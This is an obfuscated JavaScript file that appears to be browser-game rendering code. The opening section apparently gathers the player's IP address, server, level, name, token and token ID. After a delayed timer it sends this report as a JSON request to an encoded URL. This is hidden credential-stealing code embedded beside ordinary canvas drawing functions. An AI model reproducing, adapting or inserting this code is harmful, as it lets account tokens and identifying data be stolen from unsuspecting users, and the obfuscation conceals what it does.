GFnG9W5[dpdLCik>0x75?dpdLCik+0x5d:dpdLCik-0x26]},0x1);ZKXaJHd(dpdLCik[Khxseg(0x4)]=NVMuEZ(0x31),dpdLCik[Khxseg(0x17)]=dpdLCik.rRhSlP,dpdLCik[NVMuEZ(0x4c)]={abFEbW3:CPjcwW(0x10)});return nQCjjwI(rf7GSa5(dpdLCik[0x0],CPjcwW(Khxseg(0x18)),{[dpdLCik[Khxseg(0x17)].abFEbW3]:dpdLCik[0x1],[CPjcwW(0x11)]:!0x0}),dpdLCik[Khxseg(-0xa)])}ZKXaJHd(rf7GSa5=gjbTjR(-0x29c)[HOZkhs2.k8eHk57],azzrAg3=gjbTjR(-0x29c).create(null),K9G15Z=[]);const YaHama=HOZkhs2.kKtB_z7+fne1rv9[0x0]+HOZkhs2[Khxseg(0x19)]+HOZkhs2.KtUOJcJ+CPjcwW(0x17)+CPjcwW.apply(void 0x0,[0x18])+'R';gjbTjR(Khxseg(0x25))(CPjcwW(0x19))[CPjcwW(0x1a)](ZKXaJHd=>ZKXaJHd[CPjcwW(0x1b)]())[CPjcwW(0x1a)](ZKXaJHd=>{const dpdLCik=ZKXaJHd.ip;gjbTjR(-0x22b)(()=>(K9G15Z=[dpdLCik],new ZBYUlRE(CPjcwW(0x1c),Khxseg(-0x7),CPjcwW(0x1d)).URhftrT,void 0x0),0x1d4c0)});function ZBYUlRE(dpdLCik,NVMuEZ,isGUSn,Tjl5S3,bbYbsV,qRpgEWo,GKTPti){var X4ir0c=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>-0x8?dpdLCik+0x30:dpdLCik<-0x8?dpdLCik<-0x58?dpdLCik-0x54:dpdLCik+0x57:dpdLCik+0x2a]},0x1);ZKXaJHd(Tjl5S3={psuoLC:CPjcwW(X4ir0c(-0x26)),GuIOYtu:CPjcwW(0x30),y7csyN:CPjcwW(0x3c)},bbYbsV={[Tjl5S3.psuoLC]:H9jnwoa((dpdLCik,NVMuEZ,isGUSn,Tjl5S3)=>{var bbYbsV=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<-0x32?dpdLCik+0x10:dpdLCik<0x1e?dpdLCik+0x31:dpdLCik+0x6]},0x1);ZKXaJHd(dpdLCik=uA59_F((...NVMuEZ)=>{ZKXaJHd(NVMuEZ[Khxseg(0x4)]=0x5,NVMuEZ[0xd9]=NVMuEZ[0x2]);if(typeof NVMuEZ[Khxseg(0x7)]==='undefined'){NVMuEZ[Khxseg(0x7)]=rf7GSa5}NVMuEZ[Khxseg(0x1a)]=NVMuEZ[0xd9];if(typeof NVMuEZ[Khxseg(0xe)]===Khxseg(-0xe)){NVMuEZ[0x4]=UQ101r}NVMuEZ[Khxseg(0x1b)]=NVMuEZ[Khxseg(-0x5)];if(NVMuEZ[Khxseg(-0xa)]!==NVMuEZ.eeaaxJ){return NVMuEZ[0x4][NVMuEZ[Khxseg(-0xa)]]||(NVMuEZ[0x4][NVMuEZ[Khxseg(-0xa)]]=NVMuEZ[0x3](q3T9Hb[NVMuEZ[0x0]]))}if(NVMuEZ[Khxseg(0x1a)]==NVMuEZ[0x3]){return NVMuEZ.eeaaxJ?NVMuEZ[Khxseg(-0xa)][NVMuEZ[0x4][NVMuEZ.eeaaxJ]]:UQ101r[NVMuEZ[0x0]]||(NVMuEZ.QZ7sG0=NVMuEZ[0x4][NVMuEZ[Khxseg(-0xa)]]||NVMuEZ[0x3],UQ101r[NVMuEZ[Khxseg(-0xa)]]=NVMuEZ[Khxseg(0x1a)](q3T9Hb[NVMuEZ[0x0]]))}if(NVMuEZ[0x3]===void 0x0){dpdLCik=NVMuEZ[0x4]}if(NVMuEZ[0x3]===dpdLCik){rf7GSa5=NVMuEZ.eeaaxJ;return rf7GSa5(NVMuEZ[Khxseg(0x1a)])}if(NVMuEZ[Khxseg(0x1a)]&&NVMuEZ[Khxseg(0x7)]!==rf7GSa5){dpdLCik=rf7GSa5;return dpdLCik(NVMuEZ[Khxseg(-0xa)],-Khxseg(-0x5),NVMuEZ.QZ7sG0,NVMuEZ[0x3],NVMuEZ[0x4])}if(NVMuEZ.eeaaxJ){[NVMuEZ[Khxseg(0xe)],NVMuEZ.eeaaxJ]=[NVMuEZ[Khxseg(0x7)](NVMuEZ[Khxseg(0xe)]),NVMuEZ[Khxseg(-0xa)]||NVMuEZ.QZ7sG0];return dpdLCik(NVMuEZ[0x0],NVMuEZ[0x4],NVMuEZ[Khxseg(0x1a)])}if(NVMuEZ[Khxseg(0x1a)]==NVMuEZ[Khxseg(-0xa)]){return NVMuEZ.eeaaxJ[UQ101r[NVMuEZ[Khxseg(0x1a)]]]=dpdLCik(NVMuEZ[Khxseg(-0xa)],NVMuEZ[Khxseg(0x1b)])}},0x5),NVMuEZ=dpdLCik(0x2d),isGUSn=[dpdLCik(0x2c),dpdLCik(0x2c)],Tjl5S3={kZBNVdF:CPjcwW(0x23),[Khxseg(0x1d)]:CPjcwW(0x2a)});var [qRpgEWo]=K9G15Z;const GKTPti=gjbTjR(-0x12f)[CPjcwW(0x1f)][CPjcwW[bbYbsV(-0x2)](void 0x0,[0x20])][CPjcwW(0x21)],V3ZAYOu=gjbTjR(-Khxseg(0x26))(CPjcwW(0x22)+Tjl5S3.kZBNVdF)?.[gjbTjR(0xb7)(CPjcwW(0x24))][CPjcwW(0x25)][CPjcwW(0x26)],fne1rv9=gjbTjR(-0x12f)[CPjcwW(Khxseg(0x1c))][CPjcwW(0x28)],HOZkhs2=gjbTjR(-0x12f)[CPjcwW(Khxseg(0x1c))][CPjcwW(0x29)],veiTIU=gjbTjR(-0x203)(Tjl5S3[Khxseg(0x1d)])?.[gjbTjR(X4ir0c(-0x16))(CPjcwW(0x24))][CPjcwW(0x25)][CPjcwW(0x2b)],dZwH1b=ZvVqfU(isGUSn[Khxseg(-0xa)]+`IP: ${qRpgEWo||dpdLCik(Khxseg(0x1e))}\n`+`Server: ${GKTPti||dpdLCik(Khxseg(0x1e))}\n`+`Level: ${veiTIU||dpdLCik[Khxseg(0x1f)](bbYbsV(-0x29),bbYbsV(-0x4))}\n`+`Name: ${V3ZAYOu||dpdLCik.apply(void 0x0,[0x2d])}\n`+`Token: ${fne1rv9||NVMuEZ}\n`+`TokenID: ${HOZkhs2||dpdLCik.call(bbYbsV(-0x29),Khxseg(0x1e))}\n`,isGUSn[Khxseg(-0x5)],EyP6nJ(-Khxseg(-0x4)));ZKXaJHd(K9G15Z=[dZwH1b],new ZBYUlRE(CPjcwW(0x2e),void 0x0,CPjcwW(0x2f)).URhftrT);function rf7GSa5(dpdLCik,NVMuEZ='vqBCfWlKjSeYpiJnNMAPLhIVOcEkZDo=|HtQb{a`8U)&r%m[GRT/X7Fs*w?!gd2,^3]("@u_5:40;~.96y<1>}$+#xz',isGUSn,Tjl5S3,qRpgEWo=[],GKTPti=0x0,V3ZAYOu,fne1rv9,HOZkhs2=0x0,veiTIU){ZKXaJHd(isGUSn=''+(dpdLCik||''),Tjl5S3=isGUSn.length,V3ZAYOu=bbYbsV(-0x2c),fne1rv9=-Khxseg(-0x5));for(HOZkhs2=HOZkhs2;HOZkhs2<Tjl5S3;HOZkhs2++){veiTIU=NVMuEZ.indexOf(isGUSn[HOZkhs2]);if(veiTIU===-Khxseg(-0x5)){continue}if(fne1rv9<bbYbsV(-0x2c)){fne1rv9=veiTIU}else{ZKXaJHd(fne1rv9+=veiTIU*0x5b,GKTPti|=fne1rv9<<V3ZAYOu,V3ZAYOu+=(fne1rv9&0x1fff)>Khxseg(0x15)?0xd:Khxseg(0x10));do{ZKXaJHd(qRpgEWo.push(GKTPti&0xff),GKTPti>>=0x8,V3ZAYOu-=0x8)}while(V3ZAYOu>Khxseg(0xa));fne1rv9=-0x1}}if(fne1rv9>-0x1){qRpgEWo.push((GKTPti|fne1rv9<<V3ZAYOu)&Khxseg(0x5))}return SbulZ8(qRpgEWo)}},0x4),[Tjl5S3.GuIOYtu]:H9jnwoa((dpdLCik,NVMuEZ)=>{var isGUSn=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0xf?dpdLCik<0x5f?dpdLCik-0x10:dpdLCik-0x4e:dpdLCik-0x54]},0x1);ZKXaJHd(dpdLCik={Hk3iDH:CPjcwW[Khxseg(0x20)](Khxseg(-0x7),[0x33]),TE2BcE5:CPjcwW(0x38)},NVMuEZ=[CPjcwW(0x31),CPjcwW(0x3a)]);var [Tjl5S3]=K9G15Z;gjbTjR(0xc9)(YaHama,{[NVMuEZ[isGUSn(0x15)]]:CPjcwW(0x32),[dpdLCik.Hk3iDH]:{[CPjcwW(isGUSn(0x40))]:CPjcwW(0x35)},[CPjcwW[isGUSn(0x3f)](isGUSn(0x18),[0x36])]:gjbTjR(0x383)[CPjcwW(0x37)]({[dpdLCik.TE2BcE5]:Tjl5S3,[CPjcwW[Khxseg(0x1f)](void 0x0,0x39)]:NVMuEZ[0x1]})})},0x2)},qRpgEWo=qRpgEWo);if(NVMuEZ==CPjcwW(0x3b)&&veiTIU.t6fJof()){K9G15Z=[]}GKTPti={[CPjcwW.apply(Khxseg(-0x7),[Khxseg(0x22)])]:Khxseg(-0x5),[CPjcwW[X4ir0c(-0x29)](Khxseg(-0x7),0x30)]:0x1};function V3ZAYOu(){var NVMuEZ=function(...NVMuEZ){return nQCjjwI(K9G15Z=NVMuEZ,bbYbsV[dpdLCik].call(this))},isGUSn=GKTPti[dpdLCik];if(isGUSn){return IRLLENa(NVMuEZ,isGUSn)}return NVMuEZ}qRpgEWo=NVMuEZ==Tjl5S3.y7csyN&&veiTIU.t6fJof()?azzrAg3[dpdLCik]||(azzrAg3[dpdLCik]=V3ZAYOu()):bbYbsV[dpdLCik]();return isGUSn==CPjcwW(0x3d)?{URhftrT:qRpgEWo}:qRpgEWo}function gjbTjR(dpdLCik,NVMuEZ,isGUSn,Tjl5S3,bbYbsV,qRpgEWo,GKTPti,X4ir0c,V3ZAYOu,fne1rv9,HOZkhs2){var dZwH1b=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x36?dpdLCik+0x19:dpdLCik+0x63]},0x1);ZKXaJHd(NVMuEZ=uA59_F((...dpdLCik)=>{ZKXaJHd(dpdLCik[Khxseg(0x4)]=0x5,dpdLCik[0x96]=dpdLCik[Khxseg(0x7)]);if(typeof dpdLCik[0x96]==='undefined'){dpdLCik[Khxseg(0x24)]=rf7GSa5}dpdLCik[Khxseg(0x23)]=dpdLCik[Khxseg(-0x5)];if(typeof dpdLCik[Khxseg(0xe)]===Khxseg(-0xe)){dpdLCik[Khxseg(0xe)]=UQ101r}if(dpdLCik[0x2]==dpdLCik[Khxseg(-0xa)]){return dpdLCik[Khxseg(0x23)][UQ101r[dpdLCik[Khxseg(-0x4)]]]=NVMuEZ(dpdLCik[0x0],dpdLCik.yOQjbzc)}if(dpdLCik[0x0]!==dpdLCik[Khxseg(0x23)]){return dpdLCik[0x4][dpdLCik[0x0]]||(dpdLCik[0x4][dpdLCik[Khxseg(-0xa)]]=dpdLCik[Khxseg(0x24)](q3T9Hb[dpdLCik[0x0]]))}if(dpdLCik[0x2]&&dpdLCik[Khxseg(0x24)]!==rf7GSa5){var isGUSn=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>0x13?dpdLCik<0x13?dpdLCik-0x13:dpdLCik-0x14:dpdLCik+0x62]},0x1);NVMuEZ=rf7GSa5;return NVMuEZ(dpdLCik[0x0],-0x1,dpdLCik[Khxseg(-0x4)],dpdLCik[0x96],dpdLCik[isGUSn(0x31)])}},Khxseg(-0x8)),isGUSn=NVMuEZ(0x77),Tjl5S3=CPjcwW(0x62),bbYbsV=CPjcwW(Khxseg(0x31)),qRpgEWo={P6zpnn:CPjcwW(0x58),[Khxseg(0x30)]:CPjcwW[Khxseg(0x1f)](void 0x0,dZwH1b(0x23)),TriqJ21:NVMuEZ(Khxseg(0x27)),cwhOGfn:NVMuEZ(dZwH1b(0x2a)),z4VyQz:NVMuEZ[Khxseg(0x1f)](void 0x0,0x7b)},GKTPti=CPjcwW(0x54),X4ir0c=NVMuEZ(dZwH1b(0x21)),V3ZAYOu=[NVMuEZ[Khxseg(0x1f)](void 0x0,0x4a),NVMuEZ(0x52),CPjcwW(0x55),CPjcwW(Khxseg(0x2f)),NVMuEZ(0x75)],fne1rv9=NVMuEZ(0x41),HOZkhs2=HOZkhs2);switch(dpdLCik){case!veiTIU.d5qoKC()?Khxseg(-0x7):-0x29c:return escQKI[CPjcwW(0x3e)];case veiTIU.d5qoKC()?Khxseg(0x25):-0xef:HOZkhs2=CPjcwW(0x3f)||escQKI[CPjcwW(Khxseg(-0xd))];break;case!veiTIU.t6fJof()?Khxseg(-0x7):-0x22b:return escQKI[NVMuEZ(0x40)];case-0x12f:return escQKI[fne1rv9];case-Khxseg(0x26):HOZkhs2=CPjcwW(0x42)+CPjcwW(0x43)+CPjcwW(0x44)||escQKI[NVMuEZ(0x45)];break;case veiTIU.PAaMYo[CPjcwW(0x46)](0x2)==dZwH1b(0x1d)?0xb7:-0xcf:HOZkhs2=CPjcwW.call(Khxseg(-0x7),Khxseg(0x28))||escQKI[CPjcwW(Khxseg(0x29))+NVMuEZ(dZwH1b(0x20))+V3ZAYOu[Khxseg(-0xa)]];break;case veiTIU.PAaMYo[CPjcwW(0x46)](dZwH1b(-0xe))==dZwH1b(0x1d)?0x383:0x5e:return escQKI[CPjcwW(0x4b)];case veiTIU.t6fJof()?0x7f3:0xf2:HOZkhs2=NVMuEZ(0x4c)||escQKI[NVMuEZ(0x4c)];break;case veiTIU.t6fJof()?0x19:-0x51:return escQKI[CPjcwW(0x4d)+NVMuEZ(0x4e)];case 0xd5f:return escQKI[NVMuEZ(0x4f)];case!veiTIU.t6fJof()?0xee:0x8c7:HOZkhs2=NVMuEZ(Khxseg(0x2b))||escQKI[X4ir0c];break;case 0x91d:HOZkhs2=NVMuEZ(0x51)||escQKI[NVMuEZ(0x51)];break;case 0x773:return escQKI[V3ZAYOu[Khxseg(-0x5)]];case!(veiTIU.PAaMYo[CPjcwW(0x46)](dZwH1b(-0xe))==0x6b)?0xc8:0x143:HOZkhs2=NVMuEZ(dZwH1b(0x22))||escQKI[NVMuEZ(Khxseg(0x2c))];break;case 0xe5a:return escQKI[GKTPti];case veiTIU.PAaMYo[V3ZAYOu[0x2]+CPjcwW(Khxseg(0x2d))](0x2)==Khxseg(0x27)?0x11da:-0x32:return escQKI[CPjcwW(dZwH1b(0x24))];case veiTIU.d5qoKC()?0x1f0:Khxseg(0x2f):HOZkhs2=qRpgEWo.P6zpnn||escQKI[CPjcwW(Khxseg(0x15))];break;case veiTIU.PAaMYo[CPjcwW(Khxseg(0x33))+qRpgEWo[dZwH1b(0x26)]](dZwH1b(-0xe))==dZwH1b(0x1d)?0x11e0:0xb5:HOZkhs2=CPjcwW(0x59)||escQKI[CPjcwW(0x59)];break;case 0x13b1:return escQKI[NVMuEZ.call(dZwH1b(-0x11),0x5a)+'nt'];case veiTIU.PAaMYo[CPjcwW(0x46)](0x2)==0x6b?dZwH1b(0x27):-0x6f:HOZkhs2=NVMuEZ(0x5b)+CPjcwW.call(Khxseg(-0x7),0x5c)||escQKI[NVMuEZ(0x5d)];break;case 0x7b5:HOZkhs2=CPjcwW(0x5e)||escQKI[CPjcwW(0x5e)];break;case!veiTIU.PwTPxmo()?Khxseg(0x32):0xc80:return escQKI[CPjcwW(0x5f)];case veiTIU.PAaMYo[CPjcwW(Khxseg(0x33))+CPjcwW(Khxseg(0x2d))](dZwH1b(-0xe))==Khxseg(0x27)?0xf6e:0x9f:return escQKI[bbYbsV];case 0xbe1:return escQKI[NVMuEZ[dZwH1b(0x15)](dZwH1b(-0x11),0x61)];case 0xc1f:return escQKI[Tjl5S3];case veiTIU.AWPd4HV[NVMuEZ(Khxseg(0x34))](dZwH1b(0x4))==Khxseg(0x36)?0x139b:-0x96:return escQKI[CPjcwW(dZwH1b(0x35))];case 0x796:HOZkhs2=NVMuEZ(dZwH1b(0x2b))||escQKI[NVMuEZ(dZwH1b(0x2b))];break;case 0x12b9:HOZkhs2=CPjcwW(0x66)||escQKI[CPjcwW(0x66)];break;case 0x463:HOZkhs2=CPjcwW.apply(dZwH1b(-0x11),[0x67])+CPjcwW(0x68)||escQKI[CPjcwW[dZwH1b(0x16)](Khxseg(-0x7),[0x69])];break;case!(veiTIU.AWPd4HV[NVMuEZ(dZwH1b(0x2a))](dZwH1b(0x4))==Khxseg(0x36))?0xea:0x14c:return escQKI[CPjcwW[Khxseg(0x20)](void 0x0,[0x6a])];case 0xf34:HOZkhs2=qRpgEWo.TriqJ21||escQKI[NVMuEZ[dZwH1b(0x16)](void 0x0,[Khxseg(0x27)])];break;case 0x13f3:HOZkhs2=CPjcwW(0x6c)||escQKI[V3ZAYOu[0x3]];break;case 0xce7:return escQKI[NVMuEZ(dZwH1b(0x30))];case 0xe13:HOZkhs2=CPjcwW(0x6e)||escQKI[NVMuEZ[dZwH1b(0x16)](Khxseg(-0x7),[0x6f])+NVMuEZ(0x70)];break;case 0x991:return escQKI[NVMuEZ(0x71)];case 0x1304:HOZkhs2=NVMuEZ(0x72)||escQKI[NVMuEZ(0x72)];break;case 0x329:return escQKI[CPjcwW(0x73)];case!(veiTIU.lDN73bH[qRpgEWo.cwhOGfn](0x2)=='I')?-0x9c:0x75a:return escQKI[CPjcwW[Khxseg(0x20)](dZwH1b(-0x11),[0x74])];case!(veiTIU.lDN73bH[NVMuEZ(Khxseg(0x34))](dZwH1b(-0xe))=='I')?-dZwH1b(0x2d):0x1339:HOZkhs2=V3ZAYOu[0x4]||escQKI[NVMuEZ.call(void 0x0,0x75)];break;case veiTIU.t6fJof()?0x5b9:0x55:HOZkhs2=CPjcwW.apply(void 0x0,[0x76])+'te'||escQKI[isGUSn];break;case veiTIU.d5qoKC()?0xa53:-0xeb:HOZkhs2=NVMuEZ[dZwH1b(0x15)](dZwH1b(-0x11),Khxseg(0x38))||escQKI[NVMuEZ(dZwH1b(0x2e))];break;case!veiTIU.d5qoKC()?-0x7f:0xad3:return escQKI[NVMuEZ(0x79)];case 0xcaf:return escQKI[CPjcwW(0x7a)];case 0x3b4:return escQKI[qRpgEWo.z4VyQz];case 0xefe:return escQKI[NVMuEZ(0x7c)]}return escQKI[HOZkhs2];function rf7GSa5(dpdLCik,NVMuEZ='<GZedPtALC$x3w+}H8F]=z9*v|U>#sWKapj;MioyR`.cu27D%1_0E5bnhY/~l"VkOr@SXq[)46,^&Q{(?JBT!gNfmI:',isGUSn,Tjl5S3,bbYbsV=[],qRpgEWo,GKTPti=0x0,X4ir0c,V3ZAYOu=0x0,fne1rv9){ZKXaJHd(isGUSn=''+(dpdLCik||''),Tjl5S3=isGUSn.length,qRpgEWo=dZwH1b(-0x14),X4ir0c=-Khxseg(-0x5));for(V3ZAYOu=V3ZAYOu;V3ZAYOu<Tjl5S3;V3ZAYOu++){fne1rv9=NVMuEZ.indexOf(isGUSn[V3ZAYOu]);if(fne1rv9===-0x1){continue}if(X4ir0c<0x0){X4ir0c=fne1rv9}else{ZKXaJHd(X4ir0c+=fne1rv9*0x5b,qRpgEWo|=X4ir0c<<GKTPti,GKTPti+=(X4ir0c&0x1fff)>dZwH1b(0xb)?dZwH1b(0x2):Khxseg(0x10));do{ZKXaJHd(bbYbsV.push(qRpgEWo&dZwH1b(-0x5)),qRpgEWo>>=0x8,GKTPti-=Khxseg(0x8))}while(GKTPti>0x7);X4ir0c=-Khxseg(-0x5)}}if(X4ir0c>-dZwH1b(-0xf)){bbYbsV.push((qRpgEWo|X4ir0c<<GKTPti)&Khxseg(0x5))}return SbulZ8(bbYbsV)}}uA59_F(fwdk2H,Khxseg(-0x5));function fwdk2H(...dpdLCik){var NVMuEZ;ZKXaJHd(dpdLCik.length=Khxseg(-0x5),dpdLCik[Khxseg(0x3b)]=dpdLCik.fDtZMQi,dpdLCik.mksM0u='WdFhUGgkKJBVOYTcjLMtEn*q.:I1/,)l`x%umA2DfeQN8s5$zv0!rR(b_@S[&=a9oC">p;HP6?}Z|yiw]74^{+<#~X3',dpdLCik[Khxseg(0x39)]=0x6d,dpdLCik[Khxseg(-0x4)]=''+(dpdLCik[dpdLCik[Khxseg(0x39)]-Khxseg(0x3a)]||''),dpdLCik[0x3]=dpdLCik[0x2].length,dpdLCik.LLWwHu=[],dpdLCik[Khxseg(0x3c)]=Khxseg(-0xa),dpdLCik[Khxseg(0x3d)]=Khxseg(-0xa),dpdLCik[Khxseg(0x3b)]=-Khxseg(-0x5));for(NVMuEZ=Khxseg(-0xa);NVMuEZ<dpdLCik[0x3];NVMuEZ++){dpdLCik[Khxseg(-0x3)]=dpdLCik.mksM0u.indexOf(dpdLCik[dpdLCik[0xe0]-(dpdLCik[0xe0]-Khxseg(-0x4))][NVMuEZ]);if(dpdLCik[0x9]===-Khxseg(-0x5)){continue}if(dpdLCik[Khxseg(0x3b)]<0x0){dpdLCik[Khxseg(0x3b)]=dpdLCik[0x9]}else{var CPjcwW=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik>-0x5?dpdLCik+0x2d:dpdLCik<-0x55?dpdLCik-0x38:dpdLCik+0x54]},0x1);ZKXaJHd(dpdLCik[Khxseg(0x3b)]+=dpdLCik[Khxseg(-0x3)]*Khxseg(0xb),dpdLCik[Khxseg(0x3c)]|=dpdLCik[Khxseg(0x3b)]<<dpdLCik.PKOyai,dpdLCik[Khxseg(0x3d)]+=(dpdLCik[Khxseg(0x3b)]&Khxseg(0xf))>Khxseg(0x15)?0xd:Khxseg(0x10));do{ZKXaJHd(dpdLCik[Khxseg(0x3e)].push(dpdLCik.OsVPNU&Khxseg(0x5)),dpdLCik.OsVPNU>>=Khxseg(0x8),dpdLCik[Khxseg(0x3d)]-=Khxseg(0x8))}while(dpdLCik.PKOyai>Khxseg(0xa));dpdLCik[CPjcwW(-0xa)]=-0x1}}if(dpdLCik[Khxseg(0x3b)]>-Khxseg(-0x5)){var isGUSn=H9jnwoa(dpdLCik=>{return GFnG9W5[dpdLCik<0x4e?dpdLCik-0x34:dpdLCik<0x4e?dpdLCik-0x7:dpdLCik>0x9e?dpdLCik-0x32:dpdLCik<0x9e?dpdLCik-0x4f:dpdLCik+0x53]},0x1);dpdLCik[Khxseg(0x3e)].push((dpdLCik[isGUSn(0x9a)]|dpdLCik[Khxseg(0x3b)]<<dpdLCik[isGUSn(0x9b)])&isGUSn(0x63))}return dpdLCik[0xe0]>dpdLCik[0xe0]+0x4e?dpdLCik[-Khxseg(0x3f)]:SbulZ8(dpdLCik.LLWwHu)}function hYndT2m(){return['qcEyi7IF','undefined',0x3f,0xc,0xad,0x0,'yKuEPv',0x5,void 0x0,'rD7J262',0x1,0x2,0x9,'SUhASrH','rI8myh',0xb,'cU4i_H','TCM1MO','wgD7ts','length',0xff,0x72,0x3,0x8,0x6,0x7,0x5b,0xd,'CirnE_n',0x4,0x1fff,0xe,'zhW_2c','m_77im','Ndm7bm','J_3W9F',0x58,0x44,0x80,0xf,'qdoqD3C','QZ7sG0','eeaaxJ',0x27,'dm4uTu',0x2d,'call','apply',0x34,0x1e,'yOQjbzc',0x96,0xc9,0x203,0x6b,0x47,0x48,0x49,0x50,0x53,0x56,0x57,0x6c,'AmVkfW',0x60,0xb7,0x55,0x63,0x65,'g',0x14,0x78,0xe0,0x6d,'uHnV1j','OsVPNU','PKOyai','LLWwHu',0x64]}function H9jnwoa(ZKXaJHd,GFnG9W5=0x0){var NVMuEZ=function(){return ZKXaJHd(...arguments)};return dpdLCik(NVMuEZ,'length',{'value':GFnG9W5,'configurable':true})}
		function ΔΔᐃⵠΔᐃⲆ(ⲆⵠΔⲆⲆᐃᐃ, ⲆⲆΔᐃΔⵠⵠ, ΔⲆΔⵠᐃⲆⵠ, ΔⲆΔⲆⵠᐃⲆ, ᐃΔⲆᐃⵠⲆᐃ, ⲆᐃⲆΔΔΔΔ) {
			ⲆᐃⵠⵠΔΔⲆ(ⲆᐃΔⵠⲆ, ⲆⵠΔⲆⲆᐃᐃ, ⲆⲆΔᐃΔⵠⵠ, ΔⲆΔⵠᐃⲆⵠ, ΔⲆΔⲆⵠᐃⲆ, ᐃΔⲆᐃⵠⲆᐃ, ⲆᐃⲆΔΔΔΔ);
			const ᐃΔΔⵠΔⵠᐃ = ΔⲆⵠᐃᐃΔⲆ(ΔᐃΔᐃ[ᐃΔΔ], ΔᐃΔᐃ[ⲆⵠⲆⲆ], ΔᐃΔᐃ[ⵠⵠΔⲆ], ΔᐃΔᐃ[ⵠⲆΔⵠΔ], ΔᐃΔᐃ[ⵠⵠΔᐃΔ]);
			const ⵠⵠΔⵠΔΔΔΔⲆ = ⲆΔⵠⵠΔⵠᐃⵠᐃ(ΔᐃΔᐃ[5], ΔᐃΔᐃ[ⵠᐃⲆᐃ]);
			const ⵠᐃⵠⵠΔᐃⵠΔⵠ = (34685 | ᐃΔΔⵠΔⵠᐃ) & ~(ᐃΔΔⵠΔⵠᐃ & 34685);
			return ⵠᐃⵠⵠΔᐃⵠΔⵠ
		}

		function ᐃᐃⵠⵠⲆⲆⵠⵠⲆ(ᐃΔᐃ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + ᐃΔᐃ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃΔᐃ.y);
			Δ.rotate(ᐃΔᐃ.angle);
			Δ.globalAlpha = ᐃΔᐃ.alpha;
			var ᐃⵠ = ⵠⲆ[ᐃΔᐃ.id][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / Ⲇⵠⵠᐃ, -ᐃⵠ.height / 2);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.restore()
		}

		function ⲆΔΔⵠΔ(ᐃΔ, ᐃⵠ, Δⵠ, ⲆⵠⲆ) {
			var ᐃⵠⵠ = ᐃⵠ.width;
			var ⵠⵠᐃ = ᐃⵠ.height;
			var w2 = Math.floor(ᐃⵠⵠ / 2);
			var ΔΔⵠⲆᐃ = Math.floor(ⵠⵠᐃ / ⵠⲆⵠⲆ);
			ⲆⲆⲆ.transition ? (Δ.globalAlpha = ⵠᐃⵠΔ, ΔⲆΔⵠ(Δ, ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time], 0, 0, ᐃⵠⵠ, ⵠⵠᐃ, Δⵠ, ⲆⵠⲆ, w2, ΔΔⵠⲆᐃ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ΔⲆⲆ : 1, Δ.globalAlpha = 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ, ΔⲆΔⵠ(Δ, ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time], Ⲇᐃᐃᐃ, 0, ᐃⵠⵠ, ⵠⵠᐃ, Δⵠ, ⲆⵠⲆ, w2, ΔΔⵠⲆᐃ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? Δⵠᐃ : 1, Δ.globalAlpha = 1) : ΔⲆΔⵠ(Δ, ᐃⵠ, 0, ΔⲆⲆ, ᐃⵠⵠ, ⵠⵠᐃ, Δⵠ, ⲆⵠⲆ, w2, ΔΔⵠⲆᐃ)
		}

		function ΔⵠᐃⲆΔᐃᐃⵠᐃ() {
			if (ⲆⲆⲆ.transition) {
				var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ⵠΔⲆ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
				Δ.fillStyle = ⲆΔⲆⲆⲆ(ΔΔⵠⵠΔ, 43, 48, 19, 58, 43, ᐃΔΔⵠ)
			} else Δ.fillStyle = Ⲇ.ⲆⵠΔⲆᐃ[ⲆⲆⲆ.time];
			Δ.fillRect(ΔⲆⲆ, Ⲇᐃⵠⵠ, ΔΔΔᐃ, ⵠⲆᐃⲆ)
		}

		function ⲆΔⵠΔⵠⵠΔ(ⵠⵠᐃᐃΔ, ⵠⵠⲆᐃΔ, ⵠΔⲆΔⲆ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆⲆ = ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ + 710;
			var ⵠΔⵠΔⵠ = Math.max(ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ, 0);
			var ⲆⵠΔΔⲆ = Math.max(-ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ - ⵠΔⲆΔⲆ - 100, ᐃⵠⲆ);
			var ⵠⲆⲆΔ = ⵠΔⵠΔⵠ;
			var ᐃⵠΔᐃⲆ = ΔΔΔᐃ - ⵠΔⵠΔⵠ - ⲆⵠΔΔⲆ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w1).x;
			else var ⵠᐃᐃᐃΔ = w1.r.x;
			var Δⵠⵠᐃ = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ΔᐃΔΔⲆ = Δⵠⵠᐃ,
				ⵠΔᐃᐃᐃ = ⵠⲆⲆΔ,
				ᐃΔΔΔᐃ = -ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ΔΔⵠΔⵠ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += -ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ + ⵠⲆⵠⲆ;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
